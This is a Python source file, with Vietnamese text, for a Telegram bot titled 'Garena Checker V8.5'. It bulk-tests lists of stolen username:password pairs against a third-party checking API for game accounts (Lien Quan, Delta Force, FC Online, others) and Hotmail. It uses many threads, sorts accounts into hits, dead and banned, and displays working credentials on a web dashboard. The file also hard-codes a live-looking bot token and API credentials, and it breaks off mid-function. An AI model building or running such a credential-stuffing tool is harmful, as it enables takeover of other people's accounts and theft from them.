# ========================================================================
#    GARENA CHECKER BOT V8.5 - FULL PROFESSIONAL SYSTEM
# ========================================================================
#    - Hệ thống check tài khoản chuyên nghiệp
#    - Web dashboard với Chart.js, thống kê chi tiết
#    - Hiển thị HIT đẹp, đầy đủ thông tin
#    - Tự động ẩn trường rỗng, format chuyên nghiệp
#    - Hiệu ứng 3D, Matrix, Laser trên web
#    - Auto audio streaming
#    - Cache thông minh, xử lý lỗi tốt
# ========================================================================

import subprocess
import sys
import importlib
import threading
import time
import json
import os
import re
import telebot
import requests
import signal
import struct
import math
import base64
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
import random
import gc
from http.server import HTTPServer, BaseHTTPRequestHandler

def install_package(package_name):
    try:
        importlib.import_module(package_name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
        except:
            pass

for pkg in ["requests", "pyTelegramBotAPI"]:
    install_package(pkg)

# ========== FILE SYSTEM ==========
STATS_FILE = "check_stats.json"
HITS_FILE = "hits.json"
CONFIG_FILE = "config.json"
CUSTOM_AUDIO_PATH = "custom_audio.wav"
CUSTOM_AUDIO_DATA = None
AUDIO_LOCK = threading.Lock()

# ========== LOAD/SAVE DATA ==========
def load_stats():
    try:
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except:
        pass
    return {
        "total_checked": 0,
        "total_hits": 0,
        "total_dead": 0,
        "total_errors": 0,
        "total_banned": 0,
        "last_check": None,
        "history": [],
        "daily_stats": {},
        "service_stats": {},
        "user_stats": {}
    }

def save_stats(stats_data):
    try:
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(stats_data, f, ensure_ascii=False, indent=2)
    except:
        pass

def load_hits():
    try:
        if os.path.exists(HITS_FILE):
            with open(HITS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except:
        pass
    return []

def save_hits(hits_data):
    try:
        with open(HITS_FILE, 'w', encoding='utf-8') as f:
            json.dump(hits_data, f, ensure_ascii=False, indent=2)
    except:
        pass

def update_stats(hit_count=0, dead_count=0, error_count=0, banned_count=0, accounts=None, hit_details=None, service=None):
    stats_data = load_stats()
    stats_data["total_checked"] += hit_count + dead_count + error_count + banned_count
    stats_data["total_hits"] += hit_count
    stats_data["total_dead"] += dead_count
    stats_data["total_errors"] += error_count
    stats_data["total_banned"] += banned_count
    stats_data["last_check"] = datetime.now().isoformat()
    
    today = datetime.now().strftime("%Y-%m-%d")
    if today not in stats_data["daily_stats"]:
        stats_data["daily_stats"][today] = {"hits": 0, "dead": 0, "errors": 0, "banned": 0, "total": 0}
    stats_data["daily_stats"][today]["hits"] += hit_count
    stats_data["daily_stats"][today]["dead"] += dead_count
    stats_data["daily_stats"][today]["errors"] += error_count
    stats_data["daily_stats"][today]["banned"] += banned_count
    stats_data["daily_stats"][today]["total"] += hit_count + dead_count + error_count + banned_count
    
    if service:
        if service not in stats_data["service_stats"]:
            stats_data["service_stats"][service] = {"hits": 0, "dead": 0, "errors": 0, "banned": 0}
        stats_data["service_stats"][service]["hits"] += hit_count
        stats_data["service_stats"][service]["dead"] += dead_count
        stats_data["service_stats"][service]["errors"] += error_count
        stats_data["service_stats"][service]["banned"] += banned_count
    
    if accounts:
        stats_data["history"].append({
            "time": datetime.now().isoformat(),
            "total": len(accounts),
            "hits": hit_count,
            "dead": dead_count,
            "errors": error_count,
            "banned": banned_count,
            "service": service or "unknown"
        })
        if len(stats_data["history"]) > 100:
            stats_data["history"] = stats_data["history"][-100:]
    
    if hit_details:
        for hit in hit_details:
            user = hit.get("user", "unknown")
            if user not in stats_data["user_stats"]:
                stats_data["user_stats"][user] = {"count": 0, "services": [], "last_hit": None}
            stats_data["user_stats"][user]["count"] += 1
            if hit.get("service") not in stats_data["user_stats"][user]["services"]:
                stats_data["user_stats"][user]["services"].append(hit.get("service", "unknown"))
            stats_data["user_stats"][user]["last_hit"] = datetime.now().isoformat()
    
    save_stats(stats_data)
    
    if hit_details:
        hits = load_hits()
        hits.extend(hit_details)
        if len(hits) > 5000:
            hits = hits[-5000:]
        save_hits(hits)
    
    return stats_data

# ========== WEB SERVER ==========
class RenderHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = self.generate_dashboard()
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/stats':
            self.send_response(200)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.end_headers()
            stats_data = load_stats()
            hits = load_hits()
            self.wfile.write(json.dumps({
                "status": "alive",
                "checking": checking,
                "stats": stats,
                "stats_data": stats_data,
                "hits_count": len(hits),
                "services": list(SERVICE_ROUTES.keys()),
                "admin": ADMIN_USERNAME,
                "version": "8.5"
            }).encode('utf-8'))
        elif self.path == '/api/services':
            self.send_response(200)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.end_headers()
            self.wfile.write(json.dumps(SERVICE_ROUTES).encode('utf-8'))
        elif self.path == '/audio' or self.path == '/audio.wav':
            self.send_response(200)
            self.send_header('Content-type', 'audio/wav')
            self.send_header('Cache-Control', 'no-cache')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            audio_data = self.get_audio_data()
            self.wfile.write(audio_data)
        elif self.path == '/audio.mp3':
            self.send_response(200)
            self.send_header('Content-type', 'audio/mpeg')
            self.send_header('Cache-Control', 'no-cache')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            audio_data = self.get_audio_data()
            self.wfile.write(audio_data)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
    
    def get_audio_data(self):
        global CUSTOM_AUDIO_DATA
        with AUDIO_LOCK:
            if CUSTOM_AUDIO_DATA:
                return CUSTOM_AUDIO_DATA
        return self.generate_default_audio()
    
    def generate_default_audio(self):
        try:
            sample_rate = 44100
            duration = 30.0
            num_samples = int(sample_rate * duration)
            audio_buffer = bytearray()
            for i in range(num_samples):
                t = i / sample_rate
                value = int(32767 * 0.3 * (
                    math.sin(2 * math.pi * 440 * t) * 0.4 +
                    math.sin(2 * math.pi * 554 * t) * 0.3 +
                    math.sin(2 * math.pi * 659 * t) * 0.2 +
                    math.sin(2 * math.pi * 880 * t) * 0.1
                ))
                audio_buffer += struct.pack('<h', value)
            data_size = len(audio_buffer)
            header = b'RIFF' + struct.pack('<I', 36 + data_size) + b'WAVEfmt ' + struct.pack('<IHHIIHH', 16, 1, 1, sample_rate, sample_rate * 2, 2, 16) + b'data' + struct.pack('<I', data_size)
            return header + bytes(audio_buffer)
        except:
            return b''
    
    def generate_dashboard(self):
        stats_data = load_stats()
        hits = load_hits()
        
        total = stats_data.get("total_checked", 0)
        hits_count = stats_data.get("total_hits", 0)
        dead_count = stats_data.get("total_dead", 0)
        banned_count = stats_data.get("total_banned", 0)
        error_count = stats_data.get("total_errors", 0)
        hit_rate = round((hits_count / max(total, 1)) * 100, 2)
        
        service_stats = stats_data.get("service_stats", {})
        top_services = sorted(service_stats.items(), key=lambda x: x[1].get("hits", 0), reverse=True)[:5]
        
        user_stats = stats_data.get("user_stats", {})
        top_users = sorted(user_stats.items(), key=lambda x: x[1].get("count", 0), reverse=True)[:10]
        
        daily = stats_data.get("daily_stats", {})
        last_7_days = []
        for i in range(6, -1, -1):
            date = (datetime.now() - timedelta(days=i)).strftime("%Y-%m-%d")
            if date in daily:
                last_7_days.append(daily[date])
            else:
                last_7_days.append({"hits": 0, "dead": 0, "total": 0})
        
        history = stats_data.get("history", [])[-20:][::-1]
        
        services_html = ""
        for key, value in SERVICE_ROUTES.items():
            services_html += f'''
            <div class="service-card" onclick="showService('{key}')">
                <span class="service-icon">{value['icon']}</span>
                <div class="service-info">
                    <div class="service-name">{key}</div>
                    <div class="service-desc">{value['desc']}</div>
                </div>
            </div>'''
        
        history_rows = ""
        for h in history[:10]:
            history_rows += f'''
            <tr>
                <td>{h.get('time', '')[:16].replace('T', ' ')}</td>
                <td>{h.get('total', 0)}</td>
                <td class="hit-count">{h.get('hits', 0)}</td>
                <td class="dead-count">{h.get('dead', 0)}</td>
                <td class="banned-count">{h.get('banned', 0)}</td>
            </tr>'''
        
        hit_list_html = ""
        for h in hits[-30:][::-1]:
            hit_list_html += f'''
            <div class="hit-item">
                <span class="hit-acc">{h.get('user', '')}:{h.get('pwd', '')}</span>
                <span class="hit-service">{h.get('service', '')}</span>
                <span class="hit-time">{h.get('time', '')[:16].replace('T', ' ')}</span>
            </div>'''
        
        top_services_html = ""
        for s, d in top_services:
            icon = SERVICE_ROUTES.get(s, {}).get("icon", "❓")
            top_services_html += f'<div class="top-item"><span>{icon} {SERVICE_ROUTES.get(s, {}).get("desc", s)}</span><span class="top-value">{d.get("hits", 0)}</span></div>'
        
        top_users_html = ""
        for user, data in top_users[:5]:
            top_users_html += f'<div class="top-item"><span>{user}</span><span class="top-value">{data.get("count", 0)}</span></div>'
        
        return f'''<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GARENA CHECKER V8.5 - PROFESSIONAL</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: #0a0a0a;
    color: #e0e0e0;
    min-height: 100vh;
    padding: 20px;
}}
.container {{ max-width: 1200px; margin: 0 auto; }}
.header {{
    text-align: center;
    padding: 30px;
    background: linear-gradient(135deg, rgba(0,255,136,0.05), rgba(0,0,0,0.8));
    border-radius: 20px;
    border: 1px solid rgba(0,255,136,0.2);
    margin-bottom: 25px;
}}
.header h1 {{
    font-size: 2.2rem;
    background: linear-gradient(135deg, #00ff88, #00cc66);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}}
.header p {{ color: #888; margin-top: 5px; }}
.status-badge {{
    display: inline-block;
    padding: 5px 20px;
    border-radius: 20px;
    font-size: 0.85rem;
    font-weight: 600;
    margin-top: 10px;
    background: {"rgba(0,255,136,0.2)" if checking else "rgba(255,68,68,0.2)"};
    color: {"#00ff88" if checking else "#ff4444"};
    border: 1px solid {"#00ff88" if checking else "#ff4444"};
}}
.stats-grid {{
    display: grid;
    grid-template-columns: repeat(6, 1fr);
    gap: 12px;
    margin-bottom: 25px;
}}
.stat-card {{
    background: rgba(255,255,255,0.03);
    border-radius: 12px;
    padding: 15px;
    text-align: center;
    border: 1px solid rgba(255,255,255,0.05);
    transition: 0.3s;
}}
.stat-card:hover {{ transform: translateY(-3px); border-color: rgba(0,255,136,0.3); }}
.stat-card .number {{
    font-size: 1.8rem;
    font-weight: 700;
    color: #fff;
}}
.stat-card .label {{ color: #888; font-size: 0.75rem; margin-top: 3px; }}
.stat-hit .number {{ color: #00ff88; }}
.stat-dead .number {{ color: #ff4444; }}
.stat-banned .number {{ color: #ff8800; }}
.stat-error .number {{ color: #ff44ff; }}
.stat-total .number {{ color: #44aaff; }}
.stat-rate .number {{ color: #ffdd00; }}
.row {{
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 20px;
    margin-bottom: 20px;
}}
@media (max-width: 768px) {{ .row {{ grid-template-columns: 1fr; }} .stats-grid {{ grid-template-columns: repeat(3, 1fr); }} }}
.section {{
    background: rgba(255,255,255,0.03);
    border-radius: 12px;
    padding: 18px;
    border: 1px solid rgba(255,255,255,0.05);
}}
.section h2 {{
    font-size: 1.1rem;
    color: #00ff88;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}}
.section h2 .badge {{
    font-size: 0.65rem;
    background: rgba(0,255,136,0.15);
    padding: 2px 10px;
    border-radius: 12px;
    color: #00ff88;
}}
.chart-container {{ height: 180px; }}
.history-table {{ width: 100%; border-collapse: collapse; font-size: 0.8rem; }}
.history-table th {{ text-align: left; padding: 6px 8px; color: #00ff88; border-bottom: 1px solid rgba(0,255,136,0.1); }}
.history-table td {{ padding: 4px 8px; border-bottom: 1px solid rgba(255,255,255,0.03); }}
.hit-count {{ color: #00ff88; font-weight: 600; }}
.dead-count {{ color: #ff4444; font-weight: 600; }}
.banned-count {{ color: #ff8800; font-weight: 600; }}
.services-grid {{
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
    gap: 10px;
    margin-top: 10px;
}}
.service-card {{
    background: rgba(255,255,255,0.03);
    border-radius: 10px;
    padding: 12px 15px;
    display: flex;
    align-items: center;
    gap: 12px;
    border: 1px solid rgba(255,255,255,0.05);
    cursor: pointer;
    transition: 0.3s;
}}
.service-card:hover {{ border-color: #00ff88; background: rgba(0,255,136,0.05); transform: translateY(-2px); }}
.service-icon {{ font-size: 1.5rem; }}
.service-info .service-name {{ font-weight: 600; font-size: 0.9rem; }}
.service-info .service-desc {{ color: #888; font-size: 0.7rem; }}
.hit-list {{
    display: grid;
    gap: 4px;
    max-height: 250px;
    overflow-y: auto;
}}
.hit-item {{
    display: flex;
    justify-content: space-between;
    padding: 5px 10px;
    background: rgba(0,255,136,0.03);
    border-radius: 6px;
    font-size: 0.8rem;
    border: 1px solid rgba(0,255,136,0.05);
}}
.hit-item .hit-acc {{ color: #fff; font-family: monospace; }}
.hit-item .hit-service {{ color: #888; font-size: 0.7rem; }}
.hit-item .hit-time {{ color: #555; font-size: 0.65rem; }}
.top-list {{ display: grid; gap: 3px; }}
.top-item {{
    display: flex;
    justify-content: space-between;
    padding: 3px 8px;
    font-size: 0.8rem;
    border-radius: 4px;
}}
.top-item:hover {{ background: rgba(255,255,255,0.03); }}
.top-value {{ color: #00ff88; font-weight: 600; }}
.footer {{
    text-align: center;
    padding: 15px;
    color: #555;
    font-size: 0.75rem;
    border-top: 1px solid rgba(255,255,255,0.05);
    margin-top: 20px;
}}
.footer a {{ color: #00ff88; text-decoration: none; }}
::-webkit-scrollbar {{ width: 4px; }}
::-webkit-scrollbar-track {{ background: rgba(255,255,255,0.03); }}
::-webkit-scrollbar-thumb {{ background: #00ff88; border-radius: 10px; }}
.modal-overlay {{
    display: none;
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: rgba(0,0,0,0.85);
    z-index: 999;
    justify-content: center;
    align-items: center;
}}
.modal-overlay.active {{ display: flex; }}
.modal-content {{
    background: #1a1a2e;
    border: 2px solid #00ff88;
    border-radius: 16px;
    padding: 30px;
    max-width: 450px;
    width: 90%;
}}
.modal-content h2 {{ color: #00ff88; text-align: center; margin-bottom: 10px; }}
.modal-content p {{ color: #aaa; text-align: center; margin-bottom: 15px; }}
.modal-content .info {{ background: rgba(0,0,0,0.3); padding: 12px; border-radius: 8px; margin-bottom: 12px; }}
.modal-content .info div {{ display: flex; justify-content: space-between; padding: 3px 0; font-size: 0.85rem; }}
.modal-content .info div span:last-child {{ color: #00ff88; }}
.modal-content .cmd {{
    background: rgba(0,0,0,0.5);
    padding: 10px;
    border-radius: 6px;
    font-family: monospace;
    color: #00ff88;
    font-size: 0.85rem;
    text-align: center;
    margin-bottom: 12px;
}}
.modal-content .btn {{
    width: 100%;
    padding: 10px;
    background: linear-gradient(135deg, #00ff88, #00cc66);
    border: none;
    border-radius: 8px;
    color: #000;
    font-weight: 700;
    cursor: pointer;
    transition: 0.3s;
}}
.modal-content .btn:hover {{ transform: scale(1.02); }}
.modal-close {{
    float: right;
    background: none;
    border: none;
    color: #ff4444;
    font-size: 1.5rem;
    cursor: pointer;
}}
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🎮 GARENA CHECKER V8.5</h1>
        <p>Professional Account Checker System</p>
        <div class="status-badge">{"🟢 ĐANG CHẠY" if checking else "🔴 DỪNG"}</div>
        <p style="color:#555;font-size:0.8rem;margin-top:8px;">Admin: <a href="https://t.me/baohuyno1" style="color:#00ff88;">@baohuyno1</a></p>
    </div>
    
    <div class="stats-grid">
        <div class="stat-card stat-total"><div class="number">{total:,}</div><div class="label">📊 Tổng</div></div>
        <div class="stat-card stat-hit"><div class="number">{hits_count:,}</div><div class="label">✅ HIT</div></div>
        <div class="stat-card stat-dead"><div class="number">{dead_count:,}</div><div class="label">❌ DEAD</div></div>
        <div class="stat-card stat-banned"><div class="number">{banned_count:,}</div><div class="label">🚫 BANNED</div></div>
        <div class="stat-card stat-error"><div class="number">{error_count:,}</div><div class="label">⚠️ ERROR</div></div>
        <div class="stat-card stat-rate"><div class="number">{hit_rate}%</div><div class="label">📈 Hit Rate</div></div>
    </div>
    
    <div class="row">
        <div class="section">
            <h2>📈 7 Ngày <span class="badge">HIT/DEAD</span></h2>
            <div class="chart-container"><canvas id="dailyChart"></canvas></div>
        </div>
        <div class="section">
            <h2>🏆 Top Services <span class="badge">HIT</span></h2>
            <div class="top-list">{top_services_html or '<div style="color:#555;">Chưa có dữ liệu</div>'}</div>
        </div>
    </div>
    
    <div class="row">
        <div class="section">
            <h2>👑 Top Users <span class="badge">HIT</span></h2>
            <div class="top-list">{top_users_html or '<div style="color:#555;">Chưa có dữ liệu</div>'}</div>
        </div>
        <div class="section">
            <h2>📋 Lịch sử <span class="badge">{len(history)}</span></h2>
            <div style="max-height:200px;overflow-y:auto;">
                <table class="history-table">
                    <thead><tr><th>Thời gian</th><th>Total</th><th>HIT</th><th>DEAD</th><th>BAN</th></tr></thead>
                    <tbody>{history_rows or '<tr><td colspan="5" style="text-align:center;color:#555;">Chưa có</td></tr>'}</tbody>
                </table>
            </div>
        </div>
    </div>
    
    <div class="section">
        <h2>📋 Dịch vụ <span class="badge">{len(SERVICE_ROUTES)}</span></h2>
        <div class="services-grid">{services_html}</div>
    </div>
    
    <div class="section">
        <h2>🎯 HIT gần đây <span class="badge">{len(hits)}</span></h2>
        <div class="hit-list">{hit_list_html or '<div style="color:#555;text-align:center;padding:20px;">Chưa có HIT nào</div>'}</div>
    </div>
    
    <div class="footer">
        <p>© 2024 <a href="https://t.me/baohuyno1">@baohuyno1</a> | GARENA CHECKER V8.5</p>
    </div>
</div>

<div class="modal-overlay" id="modalOverlay" onclick="if(event.target===this) closeModal()">
    <div class="modal-content">
        <button class="modal-close" onclick="closeModal()">✕</button>
        <h2 id="modalTitle">Service</h2>
        <p id="modalDesc">Description</p>
        <div class="info">
            <div><span>📌 ID</span><span id="modalId">-</span></div>
            <div><span>🔗 Route</span><span id="modalRoute">-</span></div>
            <div><span>📝 Params</span><span id="modalParams">tk, mk</span></div>
        </div>
        <div class="cmd" id="modalCmd">/check user:pass service</div>
        <button class="btn" onclick="closeModal()">✅ OK</button>
    </div>
</div>

<script>
const serviceData = {{
    "lienquan": {{"icon":"🎮","name":"Lien Quan","desc":"Check Lien Quan Mobile","route":"/api/lienquan","params":"tk, mk","cmd":"/check user:pass lienquan"}},
    "miniworld": {{"icon":"🌍","name":"Mini World","desc":"Check Mini World","route":"/api/miniworld","params":"tk, mk","cmd":"/check user:pass miniworld"}},
    "blockmango": {{"icon":"🧱","name":"Blockman Go","desc":"Check Blockman Go","route":"/api/blockmango","params":"tk, mk","cmd":"/check user:pass blockmango"}},
    "deltaforce": {{"icon":"🔫","name":"Delta Force","desc":"Check Delta Force","route":"/api/deltaforce","params":"tk, mk","cmd":"/check user:pass deltaforce"}},
    "hotmail": {{"icon":"📧","name":"Hotmail","desc":"Check Hotmail","route":"/api/hotmail","params":"tk, mk","cmd":"/check user:pass hotmail"}},
    "fc": {{"icon":"⚽","name":"FC Online","desc":"Check FC Online","route":"/api/fc","params":"tk, mk","cmd":"/check user:pass fc"}},
    "fullpack": {{"icon":"📦","name":"Fullpack","desc":"Check tat ca","route":"/api/fullpack","params":"tk, mk","cmd":"/check user:pass fullpack"}}
}};

function showService(key) {{
    const data = serviceData[key];
    if (!data) return;
    document.getElementById('modalTitle').textContent = data.icon + ' ' + data.name;
    document.getElementById('modalDesc').textContent = data.desc;
    document.getElementById('modalId').textContent = key;
    document.getElementById('modalRoute').textContent = data.route;
    document.getElementById('modalParams').textContent = data.params;
    document.getElementById('modalCmd').textContent = data.cmd;
    document.getElementById('modalOverlay').classList.add('active');
}}
function closeModal() {{
    document.getElementById('modalOverlay').classList.remove('active');
}}

// Chart
const ctx = document.getElementById('dailyChart').getContext('2d');
const dailyData = {json.dumps(last_7_days)};
const labels = [];
for(let i=6; i>=0; i--) {{
    const d = new Date();
    d.setDate(d.getDate() - i);
    labels.push(d.toLocaleDateString('vi-VN', {{day:'2-digit', month:'2-digit'}}));
}}
new Chart(ctx, {{
    type: 'bar',
    data: {{
        labels: labels,
        datasets: [
            {{
                label: 'HIT',
                data: dailyData.map(d => d.hits || 0),
                backgroundColor: 'rgba(0,255,136,0.6)',
                borderColor: '#00ff88',
                borderWidth: 1,
                borderRadius: 3
            }},
            {{
                label: 'DEAD',
                data: dailyData.map(d => d.dead || 0),
                backgroundColor: 'rgba(255,68,68,0.6)',
                borderColor: '#ff4444',
                borderWidth: 1,
                borderRadius: 3
            }}
        ]
    }},
    options: {{
        responsive: true,
        maintainAspectRatio: false,
        plugins: {{
            legend: {{ labels: {{ color: '#888', font: {{ size: 10 }} }} }}
        }},
        scales: {{
            y: {{ beginAtZero: true, ticks: {{ color: '#555', font: {{ size: 9 }} }} }},
            x: {{ ticks: {{ color: '#555', font: {{ size: 9 }} }} }}
        }}
    }}
}});

setTimeout(() => location.reload(), 30000);
</script>
</body>
</html>'''
    
    def log_message(self, format, *args):
        pass

def start_render_server():
    global start_time
    start_time = time.time()
    global CUSTOM_AUDIO_DATA
    if os.path.exists(CUSTOM_AUDIO_PATH):
        try:
            with open(CUSTOM_AUDIO_PATH, 'rb') as f:
                CUSTOM_AUDIO_DATA = f.read()
            print(f"[*] Load audio custom: {len(CUSTOM_AUDIO_DATA)} bytes")
        except:
            pass
    try:
        port = int(os.environ.get("PORT", 10000))
        server = HTTPServer(("0.0.0.0", port), RenderHandler)
        print(f"[*] Web server: http://0.0.0.0:{port}")
        print(f"[*] Audio: http://0.0.0.0:{port}/audio")
        server.serve_forever()
    except Exception as e:
        print(f"[!] Web error: {e}")

threading.Thread(target=start_render_server, daemon=True).start()

# ========== CONFIG ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
ADMIN_CHAT_ID = "5736655322"
ADMIN_USERNAME = "baohuyno1"

REQUIRED_CHANNEL = "@hakiiosvip"
REQUIRED_CHANNEL_ID = "@hakiiosvip"
REQUIRED_CHANNEL_URL = "https://t.me/hakiiosvip"

API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"

DEFAULT_THREADS = 50
DEFAULT_TIMEOUT = 60
DEFAULT_RETRIES = 3
DEFAULT_DELAY = 0.3

CHECKMULTI_THREADS = 30
CHECKMULTI_DELAY = 0.5
CHECKMULTI_BATCH_SIZE = 10
CHECKMULTI_BATCH_DELAY = 3.0

OUTPUT_LOC = "loc_accounts.txt"
MAX_MESSAGE_LENGTH = 4000

SERVICE_ROUTES = {
    "lienquan": {"route": "/api/lienquan", "desc": "Lien Quan Mobile", "icon": "🎮", "params": ["tk", "mk"]},
    "miniworld": {"route": "/api/miniworld", "desc": "Mini World", "icon": "🌍", "params": ["tk", "mk"]},
    "blockmango": {"route": "/api/blockmango", "desc": "Blockman Go", "icon": "🧱", "params": ["tk", "mk"]},
    "deltaforce": {"route": "/api/deltaforce", "desc": "Delta Force", "icon": "🔫", "params": ["tk", "mk"]},
    "hotmail": {"route": "/api/hotmail", "desc": "Hotmail", "icon": "📧", "params": ["tk", "mk"]},
    "fc": {"route": "/api/fc", "desc": "FC Online", "icon": "⚽", "params": ["tk", "mk"]},
    "fullpack": {"route": "/api/fullpack", "desc": "Fullpack", "icon": "📦", "params": ["tk", "mk"]}
}

checking = False
stop_event = threading.Event()
pending_accounts = {}
stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "banned": 0, "start_time": 0}
file_lock = threading.Lock()
stats_lock = threading.Lock()
cache_results = {}
cache_lock = threading.Lock()
rate_lock = threading.Lock()
last_request_time = 0
start_time = time.time()

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")

# ========== UTILITY FUNCTIONS ==========
def rate_limit(delay=DEFAULT_DELAY):
    global last_request_time
    with rate_lock:
        current_time = time.time()
        time_since_last = current_time - last_request_time
        if time_since_last < delay:
            time.sleep(delay - time_since_last)
        last_request_time = time.time()

def fix_encoding(text):
    if not isinstance(text, str):
        return text
    replacements = {
        'Ã¡': 'á', 'Ã ': 'à', 'áº£': 'ả', 'Ã£': 'ã', 'áº¡': 'ạ',
        'Ä': 'Đ', 'Ä': 'Đ', 'Æ°': 'ư', 'Æ¡': 'ơ', 'Ã´': 'ô',
        'Ã¢': 'â', 'Äƒ': 'ă', 'Ãª': 'ê', 'Ã­': 'í', 'Ã¬': 'ì',
        'á»‹': 'ị', 'á»‰': 'ỉ', 'Ä©': 'ĩ', 'Ã³': 'ó', 'Ã²': 'ò',
        'Ãº': 'ú', 'Ã¹': 'ù', 'Ã½': 'ý', 'á»³': 'ỳ',
        'á»·': 'ỷ', 'á»µ': 'ỵ'
    }
    for old, new in replacements.items():
        text = text.replace(old, new)
    return text

def is_user_member(user_id):
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except:
        return False

def check_membership(message):
    if is_user_member(message.from_user.id):
        return True
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("📢 THAM GIA KENH", url=REQUIRED_CHANNEL_URL))
    markup.add(telebot.types.InlineKeyboardButton("✅ XAC NHAN", callback_data="check_join"))
    bot.send_message(message.chat.id, f"🔒 BAN CHUA THAM GIA KENH BAT BUOC!\n📢 {REQUIRED_CHANNEL}", reply_markup=markup)
    return False

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def callback_check_join(call):
    if is_user_member(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ Xac nhan thanh cong!")
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id, "✅ XAC NHAN THANH CONG!\nDung /start de xem huong dan.")
    else:
        bot.answer_callback_query(call.id, "❌ Ban chua tham gia kenh!", show_alert=True)

def safe_send_message(chat_id, text, parse_mode="HTML"):
    if not text:
        return
    text = fix_encoding(text)
    if len(text) > MAX_MESSAGE_LENGTH:
        parts = []
        for line in text.split('\n'):
            if not parts or len(parts[-1]) + len(line) + 1 > MAX_MESSAGE_LENGTH:
                parts.append(line)
            else:
                parts[-1] += '\n' + line
        for part in parts:
            try:
                bot.send_message(chat_id, part, parse_mode=parse_mode)
                time.sleep(0.1)
            except:
                pass
    else:
        try:
            bot.send_message(chat_id, text, parse_mode=parse_mode)
        except:
            pass

def is_valid_account(user, pwd):
    if len(user) < 2 or len(pwd) < 1:
        return False
    if len(user) > 80 or len(pwd) > 100:
        return False
    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9_.@+-]*$', user):
        return False
    if not re.match(r'^[a-zA-Z0-9_.@!$%^&*()\-+]+$', pwd):
        return False
    return True

def loc_tk_mk_only(content):
    accounts, seen = [], set()
    pattern = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80})[:|]([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
    for line in content.split('\n'):
        line = line.strip()
        if not line or re.match(r'^\d{1,2}:\d{2}(:\d{2})?$', line):
            continue
        for user, pwd in re.findall(pattern, line):
            if is_valid_account(user, pwd):
                key = f"{user}:{pwd}"
                if key not in seen:
                    seen.add(key)
                    accounts.append((user, pwd))
    return accounts, {"total": len(content.split('\n')), "valid": len(accounts)}

def save_loc_file(accounts):
    with file_lock:
        with open(OUTPUT_LOC, 'w', encoding='utf-8') as f:
            for user, pwd in accounts:
                f.write(f"{user}:{pwd}\n")

def should_skip_field(value):
    if value is None:
        return True
    if isinstance(value, str):
        v = value.lower().strip()
        if v in ["", "no", "none", "null", "n/a", "chưa xác thực", "chua xac thuc", "0", "0.0", "false"]:
            return True
        return False
    if isinstance(value, (int, float)):
        return value == 0
    if isinstance(value, bool):
        return not value
    if isinstance(value, (list, dict)):
        return not value
    return False

# ========== API CHECK ==========
def check_account_api(username, password, service, use_delay=True):
    if use_delay:
        rate_limit(DEFAULT_DELAY)
    
    cache_key = f"{username}:{password}:{service}"
    with cache_lock:
        if cache_key in cache_results:
            return cache_results[cache_key]
    
    service_info = SERVICE_ROUTES.get(service, {})
    params = {"username": API_USERNAME, "password": API_PASSWORD}
    params[service_info.get("params", ["tk", "mk"])[0]] = username
    params[service_info.get("params", ["tk", "mk"])[1]] = password
    
    for attempt in range(DEFAULT_RETRIES):
        try:
            resp = requests.get(f"{API_BASE}{service_info.get('route', '/api/lienquan')}", 
                              params=params, timeout=DEFAULT_TIMEOUT)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if isinstance(data, dict):
                        for k, v in data.items():
                            if isinstance(v, str):
                                data[k] = fix_encoding(v)
                        
                        is_banned = False
                        for field in ["banned", "ban", "aov_banned"]:
                            if field in data:
                                val = data[field]
                                if (isinstance(val, bool) and val) or (isinstance(val, str) and val.upper() in ["YES", "TRUE", "BANNED"]):
                                    is_banned = True
                                    break
                        if is_banned:
                            data["result"] = "banned"
                            with cache_lock:
                                cache_results[cache_key] = data
                            return data
                        
                        is_hit = False
                        if data.get("status") in [True, "true", 1, "1", "success", "HIT", "hit"]:
                            is_hit = True
                        if data.get("success") in [True, "true", 1, "1"]:
                            is_hit = True
